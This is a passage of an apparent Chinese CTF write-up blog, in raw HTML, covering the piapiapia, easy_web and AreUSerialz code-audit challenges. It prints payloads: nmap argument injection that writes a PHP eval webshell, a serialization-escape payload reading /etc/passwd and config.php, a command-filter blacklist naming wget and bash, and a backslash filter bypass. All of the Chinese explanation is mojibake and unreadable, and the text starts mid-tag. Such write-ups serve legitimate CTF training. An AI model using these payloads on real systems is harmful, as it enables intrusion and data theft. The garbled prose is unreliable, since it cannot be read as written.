class="string">&#x27;&#x27;</span></span><br></pre></td></tr></table></figure><img src="/2020/01/12/buuctf%E5%88%B7%E9%A2%98-%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1%E7%AF%87/TIMæˆªå›¾20200504135842.png" style="zoom:80%;"><p>å¯ä»¥çœ‹åˆ°ï¼Œç”±äºç©ºæ ¼çš„å­˜åœ¨nmapæŠŠåé¢çš„éƒ½å½“ä½œæ˜¯ä¸€ä¸ªä¸ªåŸŸåäº†ï¼Œå¹¶æˆåŠŸçš„å†™å…¥shell</p><p><strong>æˆ‘ä»¬å†çœ‹ä¸€ä¸‹å…¶ä»–çš„æƒ…å†µï¼š</strong></p><p>åªç”¨escapeshellargå‡½æ•°ï¼Œæ‰§è¡Œçš„å‘½ä»¤ï¼š</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">nmap -T5 -sT -Pn --host-timeout 2 -F <span class="string">&#x27;&#x27;</span>\<span class="string">&#x27;&#x27;</span> &lt;?php @<span class="built_in">eval</span>(<span class="variable">$_POST</span>[1]);?&gt; -oG hack.php <span class="string">&#x27;\&#x27;</span><span class="string">&#x27;&#x27;</span></span><br></pre></td></tr></table></figure><p>åªç”¨escapeshellcmdå‡½æ•°ï¼Œæ‰§è¡Œçš„å‘½ä»¤ï¼š</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">nmap -T5 -sT -Pn --host-timeout 2 -F <span class="string">&#x27; \&lt;\?php @eval\(\$_POST\[1\]\)\;\?\&gt; -oG hack.php &#x27;</span></span><br></pre></td></tr></table></figure><p>å…ˆç”¨escapeshellcmdå‡½æ•°åç”¨escapeshellargå‡½æ•°ï¼Œæ‰§è¡Œçš„å‘½ä»¤ï¼š</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">nmap -T5 -sT -Pn --host-timeout 2 -F <span class="string">&#x27;&#x27;</span>\<span class="string">&#x27;&#x27;</span> \&lt;\?php @<span class="built_in">eval</span>\(\<span class="variable">$_POST</span>\[1\]\)\;\?\&gt; -oG hack.php <span class="string">&#x27;\&#x27;</span><span class="string">&#x27;&#x27;</span></span><br></pre></td></tr></table></figure><p>è¿™ä¸‰ç§å¥½åƒéƒ½æ— æ³•æ³¨å…¥å‘½ä»¤</p><h2 id="0CTF-2016-piapiapia"><a href="#0CTF-2016-piapiapia" class="headerlink" title="[0CTF 2016]piapiapia"></a>[0CTF 2016]piapiapia</h2><h3 id="writeup-5"><a href="#writeup-5" class="headerlink" title="writeup"></a>writeup</h3><p>æ‰«ç›®å½•å‘ç°<code>www.zip</code>ï¼Œåœ¨<code>class.php</code>çœ‹åˆ°è¿‡æ»¤å‡½æ•°ï¼Œè¾“å…¥å·²ç»ä¸å¯èƒ½äº†</p><img src="/2020/01/12/buuctf%E5%88%B7%E9%A2%98-%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1%E7%AF%87/TIMæˆªå›¾20200515170617.png" style="zoom: 80%;"><p>æ‰¾äº†æ‰¾å‘ç°<code>profile.php</code>ä¸­æœ‰ä¸ªæ•æ„Ÿå‡½æ•°</p><img src="/2020/01/12/buuctf%E5%88%B7%E9%A2%98-%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1%E7%AF%87/TIMæˆªå›¾20200515170424.png" style="zoom:80%;"><p>åˆ†æä¸€ä¸‹ä»£ç æµç¨‹ï¼Œç”¨æˆ·ç™»é™†é¦–å…ˆè¿›å…¥userç±»é‡Œçš„login()æ–¹æ³•ï¼Œåœ¨é‡Œé¢ç»è¿‡çˆ¶ç±»(mysql)filteræ–¹æ³•çš„è¿‡æ»¤ï¼Œè°ƒç”¨çˆ¶ç±»çš„select()æ–¹æ³•,æ¥ç€åˆ¤æ–­md5å€¼æ˜¯å¦ç›¸ç­‰ï¼Œç›¸ç­‰è¿”å›trueï¼Œå¹¶æŠŠusernameå­˜åˆ°sessioné‡Œ</p><p>å†çœ‹çœ‹<code>update.php</code>ï¼Œè™½ç„¶æœ‰ä¸Šä¼ ä½†æ˜¯æ²¡æ³•è§£ææˆphpï¼ŒæŠŠå¡«çš„ä¿¡æ¯åºåˆ—åŒ–å­˜åˆ°æ•°æ®åº“é‡Œ</p><img src="/2020/01/12/buuctf%E5%88%B7%E9%A2%98-%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1%E7%AF%87/TIMæˆªå›¾20200515182949.png" style="zoom:67%;"><p>æ¥ç€å†çœ‹<code>profile.php</code>è¿™é‡Œè°ƒç”¨äº†userç±»çš„show_profile()æ–¹æ³•ï¼ŒåŒæ ·ç»è¿‡è¿‡æ»¤è°ƒç”¨çˆ¶ç±»çš„selectæ–¹æ³•ï¼ŒæŠŠæŸ¥è¯¢ç»“æœååºåˆ—åŒ–</p><p>ç”±äºfilterè¿›è¡Œäº†æ›¿æ¢ï¼Œå¾ˆå®¹æ˜“å°±æƒ³åˆ°äº†ååºåˆ—åŒ–å­—ç¬¦é€ƒé€¸ï¼Œçœ‹ä¸‹æ€æœ«æ›¿æ¢çš„</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">filter</span>(<span class="params">$string</span>) </span>&#123;</span><br><span class="line">$escape = <span class="keyword">array</span>(<span class="string">&#x27;\&#x27;&#x27;</span>, <span class="string">&#x27;\\\\&#x27;</span>);</span><br><span class="line">$escape = <span class="string">&#x27;/&#x27;</span> . implode(<span class="string">&#x27;|&#x27;</span>, $escape) . <span class="string">&#x27;/&#x27;</span>;</span><br><span class="line">$string = preg_replace($escape, <span class="string">&#x27;_&#x27;</span>, $string);</span><br><span class="line">$safe = <span class="keyword">array</span>(<span class="string">&#x27;select&#x27;</span>, <span class="string">&#x27;insert&#x27;</span>, <span class="string">&#x27;update&#x27;</span>, <span class="string">&#x27;delete&#x27;</span>, <span class="string">&#x27;where&#x27;</span>);</span><br><span class="line">$safe = <span class="string">&#x27;/&#x27;</span> . implode(<span class="string">&#x27;|&#x27;</span>, $safe) . <span class="string">&#x27;/i&#x27;</span>;</span><br><span class="line"><span class="keyword">return</span> preg_replace($safe, <span class="string">&#x27;hacker&#x27;</span>, $string);</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment"># æŠŠ&#x27; \\ æ›¿æ¢æˆ _ é•¿åº¦å‡ä¸€</span></span><br><span class="line"><span class="comment"># æŠŠselect insert update delete where æ›¿æ¢æˆhackerwhereæ—¶é•¿åº¦åŠ ä¸€</span></span><br></pre></td></tr></table></figure><p>æ­£å¸¸åºåˆ—åŒ–ï¼š</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">$profile[<span class="string">&#x27;phone&#x27;</span>] = <span class="string">&#x27;11111111111&#x27;</span>;</span><br><span class="line">$profile[<span class="string">&#x27;email&#x27;</span>] = <span class="string">&#x27;1111111111@qq.com&#x27;</span>;</span><br><span class="line">$profile[<span class="string">&#x27;nickname&#x27;</span>] = <span class="string">&#x27;aaaa&#x27;</span>;</span><br><span class="line">$profile[<span class="string">&#x27;photo&#x27;</span>] = <span class="string">&#x27;upload/&#x27;</span>.md5(<span class="string">&#x27;str&#x27;</span>);</span><br><span class="line"><span class="keyword">echo</span> serialize($profile);</span><br></pre></td></tr></table></figure><p>ç»“æœï¼š</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">a:<span class="number">4</span>:&#123;s:<span class="number">5</span>:<span class="string">&quot;phone&quot;</span>;s:<span class="number">11</span>:<span class="string">&quot;11111111111&quot;</span>;s:<span class="number">5</span>:<span class="string">&quot;email&quot;</span>;s:<span class="number">17</span>:<span class="string">&quot;1111111111@qq.com&quot;</span>;s:<span class="number">8</span>:<span class="string">&quot;nickname&quot;</span>;s:<span class="number">4</span>:<span class="string">&quot;aaaa&quot;</span>;s:<span class="number">5</span>:<span class="string">&quot;photo&quot;</span>;s:<span class="number">39</span>:<span class="string">&quot;upload/341be97d9aff90c9978347f66f945b77&quot;</span>;&#125;</span><br></pre></td></tr></table></figure><p>æˆ‘ä»¬å‘ç°æœ€åä¸€ä¸ªä¸å¯æ§photoï¼Œè€Œemailå’Œnicknameå¯æ§ï¼Œä½†æœ‰é•¿åº¦é™åˆ¶ï¼Œå¾ˆæ˜æ˜¾ç›´æ¥è¿™æ ·æ˜¯é€ƒé€¸ä¸å‡ºå»çš„</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span>(!preg_match(<span class="string">&#x27;/^\d&#123;11&#125;$/&#x27;</span>, $_POST[<span class="string">&#x27;phone&#x27;</span>]))</span><br><span class="line"><span class="keyword">die</span>(<span class="string">&#x27;Invalid phone&#x27;</span>);</span><br><span class="line"><span class="keyword">if</span>(!preg_match(<span class="string">&#x27;/^[_a-zA-Z0-9]&#123;1,10&#125;@[_a-zA-Z0-9]&#123;1,10&#125;\.[_a-zA-Z0-9]&#123;1,10&#125;$/&#x27;</span>, $_POST[<span class="string">&#x27;email&#x27;</span>]))</span><br><span class="line"><span class="keyword">die</span>(<span class="string">&#x27;Invalid email&#x27;</span>);</span><br><span class="line"><span class="keyword">if</span>(preg_match(<span class="string">&#x27;/[^a-zA-Z0-9_]/&#x27;</span>, $_POST[<span class="string">&#x27;nickname&#x27;</span>]) || strlen($_POST[<span class="string">&#x27;nickname&#x27;</span>]) &gt; <span class="number">10</span>)</span><br><span class="line"><span class="keyword">die</span>(<span class="string">&#x27;Invalid nickname&#x27;</span>);</span><br></pre></td></tr></table></figure><p>ä»”ç»†çœ‹ä¸‹ï¼Œæœ€åä¸€ä¸ªåŒ¹é…å’Œå‰é¢ä¿©ä¸ä¸€æ ·ï¼Œè¡¨ç¤ºåªè¦æ˜¯éå­—æ¯æ•°å­—ä¸‹åˆ’çº¿éƒ½è¡Œï¼Œæˆ‘ä»¬å¯ä»¥æ•°ç»„ç»•è¿‡è¿™ä¸¤ä¸ªå‡½æ•°ï¼Œä¸¤ä¸ªå‡½æ•°éƒ½ä¼šè¿”å›false</p><p>è¿™æ ·åºåˆ—åŒ–è¿‡ç¨‹ï¼š</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">$profile[<span class="string">&#x27;phone&#x27;</span>] = <span class="string">&#x27;11111111111&#x27;</span>;</span><br><span class="line">$profile[<span class="string">&#x27;email&#x27;</span>] = <span class="string">&#x27;1111111111@qq.com&#x27;</span>;</span><br><span class="line">$profile[<span class="string">&#x27;nickname&#x27;</span>] []= <span class="string">&#x27;aaaa&#x27;</span>;</span><br><span class="line">$profile[<span class="string">&#x27;photo&#x27;</span>] = <span class="string">&#x27;upload/&#x27;</span>.md5(<span class="string">&#x27;str&#x27;</span>);</span><br><span class="line"><span class="keyword">echo</span> serialize($profile);</span><br></pre></td></tr></table></figure><p>ç»“æœï¼š</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">a:<span class="number">4</span>:&#123;s:<span class="number">5</span>:<span class="string">&quot;phone&quot;</span>;s:<span class="number">11</span>:<span class="string">&quot;11111111111&quot;</span>;s:<span class="number">5</span>:<span class="string">&quot;email&quot;</span>;s:<span class="number">17</span>:<span class="string">&quot;1111111111@qq.com&quot;</span>;s:<span class="number">8</span>:<span class="string">&quot;nickname&quot;</span>;a:<span class="number">1</span>:&#123;i:<span class="number">0</span>;s:<span class="number">4</span>:<span class="string">&quot;aaaa&quot;</span>;&#125;s:<span class="number">5</span>:<span class="string">&quot;photo&quot;</span>;s:<span class="number">39</span>:<span class="string">&quot;upload/341be97d9aff90c9978347f66f945b77&quot;</span>;&#125;</span><br></pre></td></tr></table></figure><p>æ¥ç€æˆ‘ä»¬å°±å¯ä»¥æ— é™åˆ¶çš„å¡«å……nicknameäº†,è®©å®ƒæº¢å‡ºé€ƒé€¸å‡ºå»</p><p>æˆ‘ä»¬éœ€è¦æ·»åŠ çš„å†…å®¹,é•¿åº¦m=35</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&quot;;&#125;s:5:&quot;photo&quot;;s:11:&quot;&#x2F;etc&#x2F;passwd&quot;;&#125;</span><br></pre></td></tr></table></figure><p>åˆ—æ–¹ç¨‹</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">5n+y+m&#x3D;6n+y</span><br></pre></td></tr></table></figure><p>å¾—n=35,å³æˆ‘ä»¬éœ€è¦35ä¸ªwhereï¼Œæ„é€ </p><p><img src="/2020/01/12/buuctf%E5%88%B7%E9%A2%98-%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1%E7%AF%87/TIM%E6%88%AA%E5%9B%BE20200515220248.png"></p><p>æ³¨æ„æ•°ç»„çš„æ„é€ ï¼Œç„¶åå°±èƒ½å¾—åˆ°è¯»å–æ–‡ä»¶base64çš„å€¼</p><p>è¯•ç€å»è¯»<code>config.php</code>,éœ€è¦æ·»åŠ çš„å†…å®¹</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&quot;;&#125;s:5:&quot;photo&quot;;s:10:&quot;config.php&quot;;&#125;</span><br></pre></td></tr></table></figure><p>é•¿åº¦ä¸º34ï¼Œæ•…æ„é€ 34ä¸ªwhereï¼Œé‡æ–°æ³¨å†Œä¸ªè´¦å·å°±å¯ä»¥äº†</p><p>é•¿åº¦å‡å°(<code>\\</code>æ›¿æ¢æˆ<code>_</code>)çš„æ–¹æ³•æ²¡æ³•ç”¨ï¼Œå› ä¸ºæˆ‘ä»¬åé¢æ²¡å¯æ§çš„å­—ç¬¦</p><h2 id="å®‰æ´µæ¯-2019-easy-web"><a href="#å®‰æ´µæ¯-2019-easy-web" class="headerlink" title="[å®‰æ´µæ¯ 2019]easy_web"></a>[å®‰æ´µæ¯ 2019]easy_web</h2><h3 id="writeup-6"><a href="#writeup-6" class="headerlink" title="writeup"></a>writeup</h3><p>æ‰“å¼€å‘ç°æœ‰imgå‚æ•°ï¼Œç¬¬ä¸€æ—¶é—´æƒ³åˆ°æ–‡ä»¶åŒ…å«ï¼Œä¸¤æ¬¡base64è§£å¯†å16è¿›åˆ¶è½¬asciiå¾—åˆ°<code>555.png</code></p><p>å°è¯•<code>/etc/passwd</code>å‘ç°ä¸è¡Œï¼Œçœ‹äº†ä¸‹æºç å‘ç°æŠŠé™¤å­—æ¯æ•°å­—ç‚¹å·å­—ç¬¦éƒ½æ›¿æ¢ä¸ºç©ºäº†ï¼Œæ€è·¯è¦å¤šç‚¹ï¼Œä¸èƒ½å±€é™ä¸€ç§</p><p>ç›´æ¥è¯»index.php</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?img&#x3D;TmprMlpUWTBOalUzT0RKbE56QTJPRGN3&amp;cmd&#x3D;</span><br></pre></td></tr></table></figure><p>base64è§£å¯†å¾—åˆ°æºç ï¼š</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">error_reporting(E_ALL || ~ E_NOTICE);</span><br><span class="line">header(<span class="string">&#x27;content-type:text/html;charset=utf-8&#x27;</span>);</span><br><span class="line">$cmd = $_GET[<span class="string">&#x27;cmd&#x27;</span>];</span><br><span class="line"><span class="keyword">if</span> (!<span class="keyword">isset</span>($_GET[<span class="string">&#x27;img&#x27;</span>]) || !<span class="keyword">isset</span>($_GET[<span class="string">&#x27;cmd&#x27;</span>])) </span><br><span class="line">    header(<span class="string">&#x27;Refresh:0;url=./index.php?img=TXpVek5UTTFNbVUzTURabE5qYz0&amp;cmd=&#x27;</span>);</span><br><span class="line">$file = hex2bin(base64_decode(base64_decode($_GET[<span class="string">&#x27;img&#x27;</span>])));</span><br><span class="line">$file = preg_replace(<span class="string">&quot;/[^a-zA-Z0-9.]+/&quot;</span>, <span class="string">&quot;&quot;</span>, $file);</span><br><span class="line"><span class="keyword">if</span> (preg_match(<span class="string">&quot;/flag/i&quot;</span>, $file)) &#123;</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">&#x27;&lt;img src =&quot;./ctf3.jpeg&quot;&gt;&#x27;</span>;</span><br><span class="line">    <span class="keyword">die</span>(<span class="string">&quot;xixiï½ no flag&quot;</span>);</span><br><span class="line">&#125; <span class="keyword">else</span> &#123;</span><br><span class="line">    $txt = base64_encode(file_get_contents($file));</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">&quot;&lt;img src=&#x27;data:image/gif;base64,&quot;</span> . $txt . <span class="string">&quot;&#x27;&gt;&lt;/img&gt;&quot;</span>;</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">&quot;&lt;br&gt;&quot;</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">echo</span> $cmd;</span><br><span class="line"><span class="keyword">echo</span> <span class="string">&quot;&lt;br&gt;&quot;</span>;</span><br><span class="line"><span class="keyword">if</span> (preg_match(<span class="string">&quot;/ls|bash|tac|nl|more|less|head|wget|tail|vi|cat|od|grep|sed|bzmore|bzless|pcre|paste|diff|file|echo|sh|\&#x27;|\&quot;|\`|;|,|\*|\?|\\|\\\\|\n|\t|\r|\xA0|\&#123;|\&#125;|\(|\)|\&amp;[^\d]|@|\||\\$|\[|\]|&#123;|&#125;|\(|\)|-|&lt;|&gt;/i&quot;</span>, $cmd)) &#123;</span><br><span class="line">    <span class="keyword">echo</span>(<span class="string">&quot;forbid ~&quot;</span>);</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">&quot;&lt;br&gt;&quot;</span>;</span><br><span class="line">&#125; <span class="keyword">else</span> &#123;</span><br><span class="line">    <span class="keyword">if</span> ((<span class="keyword">string</span>)$_POST[<span class="string">&#x27;a&#x27;</span>] !== (<span class="keyword">string</span>)$_POST[<span class="string">&#x27;b&#x27;</span>] &amp;&amp; md5($_POST[<span class="string">&#x27;a&#x27;</span>]) === md5($_POST[<span class="string">&#x27;b&#x27;</span>])) &#123;</span><br><span class="line">        <span class="keyword">echo</span> `$cmd`;</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        <span class="keyword">echo</span> (<span class="string">&quot;md5 is funny ~&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>md5é‚£é‡Œæˆ‘ä»¬å¯ä»¥ä½¿ç”¨MD5ç¢°æ’ï¼Œå‘½ä»¤æ‰§è¡Œæˆ‘ä»¬å¯ä»¥<code>ca\t /fl\ag</code>ç»•è¿‡</p><img src="/2020/01/12/buuctf%E5%88%B7%E9%A2%98-%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1%E7%AF%87/TIMæˆªå›¾20200516180221.png" style="zoom:80%;"><h2 id="ç½‘é¼æ¯-2020-é’é¾™ç»„-AreUSerialz"><a href="#ç½‘é¼æ¯-2020-é’é¾™ç»„-AreUSerialz" class="headerlink" title="[ç½‘é¼æ¯ 2020 é’é¾™ç»„]AreUSerialz"></a>[ç½‘é¼æ¯ 2020 é’é¾™ç»„]AreUSerialz</h2><h3 id="writeup-7"><a href="#writeup-7" class="headerlink" title="writeup"></a>writeup</h3><p>æºç ï¼š</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br></pre></td><td class="code"><pre><span class="line"> <span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">include</span>(<span class="string">&quot;flag.php&quot;</span>);</span><br><span class="line">highlight_file(<span class="keyword">__FILE__</span>);</span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">FileHandler</span> </span>&#123;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">protected</span> $op;</span><br><span class="line">    <span class="keyword">protected</span> $filename;</span><br><span class="line">    <span class="keyword">protected</span> $content;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">        $op = <span class="string">&quot;1&quot;</span>;</span><br><span class="line">        $filename = <span class="string">&quot;/tmp/tmpfile&quot;</span>;</span><br><span class="line">        $content = <span class="string">&quot;Hello World!&quot;</span>;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;process();</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">process</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">        <span class="keyword">if</span>(<span class="keyword">$this</span>-&gt;op == <span class="string">&quot;1&quot;</span>) &#123;</span><br><span class="line">            <span class="keyword">$this</span>-&gt;write();</span><br><span class="line">        &#125; <span class="keyword">else</span> <span class="keyword">if</span>(<span class="keyword">$this</span>-&gt;op == <span class="string">&quot;2&quot;</span>) &#123;</span><br><span class="line">            $res = <span class="keyword">$this</span>-&gt;read();</span><br><span class="line">            <span class="keyword">$this</span>-&gt;output($res);</span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">            <span class="keyword">$this</span>-&gt;output(<span class="string">&quot;Bad Hacker!&quot;</span>);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">private</span> <span class="function"><span class="keyword">function</span> <span class="title">write</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">        <span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="keyword">$this</span>-&gt;filename) &amp;&amp; <span class="keyword">isset</span>(<span class="keyword">$this</span>-&gt;content)) &#123;</span><br><span class="line">            <span class="keyword">if</span>(strlen((<span class="keyword">string</span>)<span class="keyword">$this</span>-&gt;content) &gt; <span class="number">100</span>) &#123;</span><br><span class="line">                <span class="keyword">$this</span>-&gt;output(<span class="string">&quot;Too long!&quot;</span>);</span><br><span class="line">                <span class="keyword">die</span>();</span><br><span class="line">            &#125;</span><br><span class="line">            $res = file_put_contents(<span class="keyword">$this</span>-&gt;filename, <span class="keyword">$this</span>-&gt;content);</span><br><span class="line">            <span class="keyword">if</span>($res) <span class="keyword">$this</span>-&gt;output(<span class="string">&quot;Successful!&quot;</span>);</span><br><span class="line">            <span class="keyword">else</span> <span class="keyword">$this</span>-&gt;output(<span class="string">&quot;Failed!&quot;</span>);</span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">            <span class="keyword">$this</span>-&gt;output(<span class="string">&quot;Failed!&quot;</span>);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">private</span> <span class="function"><span class="keyword">function</span> <span class="title">read</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">        $res = <span class="string">&quot;&quot;</span>;</span><br><span class="line">        <span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="keyword">$this</span>-&gt;filename)) &#123;</span><br><span class="line">            $res = file_get_contents(<span class="keyword">$this</span>-&gt;filename);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> $res;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">private</span> <span class="function"><span class="keyword">function</span> <span class="title">output</span>(<span class="params">$s</span>) </span>&#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">&quot;[Result]: &lt;br&gt;&quot;</span>;</span><br><span class="line">        <span class="keyword">echo</span> $s;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">__destruct</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">        <span class="keyword">if</span>(<span class="keyword">$this</span>-&gt;op === <span class="string">&quot;2&quot;</span>)</span><br><span class="line">            <span class="keyword">$this</span>-&gt;op = <span class="string">&quot;1&quot;</span>;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;content = <span class="string">&quot;&quot;</span>;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;process();</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">is_valid</span>(<span class="params">$s</span>) </span>&#123;</span><br><span class="line">    <span class="keyword">for</span>($i = <span class="number">0</span>; $i &lt; strlen($s); $i++)</span><br><span class="line">        <span class="keyword">if</span>(!(ord($s[$i]) &gt;= <span class="number">32</span> &amp;&amp; ord($s[$i]) &lt;= <span class="number">125</span>))</span><br><span class="line">            <span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">    <span class="keyword">return</span> <span class="literal">true</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>($_GET&#123;<span class="string">&#x27;str&#x27;</span>&#125;)) &#123;</span><br><span class="line"></span><br><span class="line">    $str = (<span class="keyword">string</span>)$_GET[<span class="string">&#x27;str&#x27;</span>];</span><br><span class="line">    <span class="keyword">if</span>(is_valid($str)) &#123;</span><br><span class="line">        $obj = unserialize($str);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>å…ˆçœ‹ä¸€ä¸‹ä»£ç å¤§ä½“æ€è·¯ï¼Œé¦–å…ˆåˆ¤æ–­ååºåˆ—åŒ–å­—ç¬¦ä¸²æ˜¯å¦ç¬¦åˆè§„åˆ™ï¼Œç¬¦åˆåˆ™ååºåˆ—åŒ–ï¼Œé¦–å…ˆè¿›å…¥<code>__destruct()</code>å‡½æ•°ï¼Œé¦–å…ˆåˆ¤æ–­<code>$this-&gt;op</code>å‚æ•°çš„å€¼ï¼Œç„¶åå°†<code>$this-&gt;content</code>è®¾ç½®ä¸ºç©ºï¼Œæœ€åè¿›å…¥<code>$this-&gt;process()</code>ï¼Œæ ¹æ®<code>$this-&gt;op</code>çš„å€¼åˆ¤æ–­è¿›è¡Œå†™è¿˜æ˜¯è¯»æ“ä½œ</p><p>å¾ˆæ˜æ˜¾å†™æ–‡ä»¶å·²ç»ä¸å¯èƒ½äº†ï¼Œå› 